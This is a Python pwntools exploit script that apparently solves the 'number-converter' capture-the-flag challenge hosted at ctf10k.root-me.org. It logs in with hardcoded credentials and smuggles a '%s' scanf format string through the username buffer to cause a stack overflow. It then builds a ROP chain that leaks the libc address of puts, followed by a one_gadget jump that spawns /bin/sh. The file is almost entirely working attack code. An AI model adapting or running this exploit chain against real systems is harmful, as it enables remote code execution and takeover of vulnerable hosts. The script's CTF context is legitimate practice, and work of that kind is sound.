#!/usr/bin/python3
from pwn import *

e = ELF("./number-converter")
libc = ELF("./libc-number-converter.so.6")
context.terminal = ["konsole", "-e"]


def login(p):
    username_addr = e.symbols[b"username"]

    username = b"admin" + b"\x00" * 3 # pass username check
    password = b"sup3rus3r"
    username += b"%s" + b"\x00" * 6 # the format string to use in the scanf call. %s to exploit buffer overflow
    username += p64(username_addr + 8) # pointer to the format string input

    p.recvuntil("login:")
    p.sendline(username)
    p.recvuntil("password:")
    p.sendline(password)


def trigger_rop(p, ropchain):
    fake_choice = "-5" # leads to our pointer to "%s"
    padding = b"A" * 24 # padding to reach the ret pointer
    
    p.recvuntil("> ")
    p.sendline(fake_choice)
    p.recvuntil("Input number:")
    p.sendline(padding + ropchain)
    p.recvuntil("> ")
    p.sendline("0") # exit to trigger ropchain


p = remote("ctf10k.root-me.org", 5006)

# First ropchain : leak libc puts address and return to main
puts_got = e.got[b"puts"]
puts_addr = e.symbols[b"puts"]
main_addr = e.symbols[b"main"]
pop_rdi = 0x401583

login(p)
ropchain = p64(pop_rdi) + p64(puts_got) + p64(puts_addr) + p64(main_addr)
trigger_rop(p, ropchain)
puts_leak = u64(p.recv(6) + b"\x00\x00")
print("puts leak", hex(puts_leak))


# Second ropchain : jump to one_gadget
puts_offset = libc.symbols[b"puts"]
#0xe3b31 execve("/bin/sh", r15, rdx)
#constraints:
#  [r15] == NULL || r15 == NULL
#  [rdx] == NULL || rdx == NULL
one_gadget_offset = 0xe3b31
jump_address = puts_leak - puts_offset + one_gadget_offset

login(p)
trigger_rop(p, p64(jump_address))

# Shell !
p.interactive()
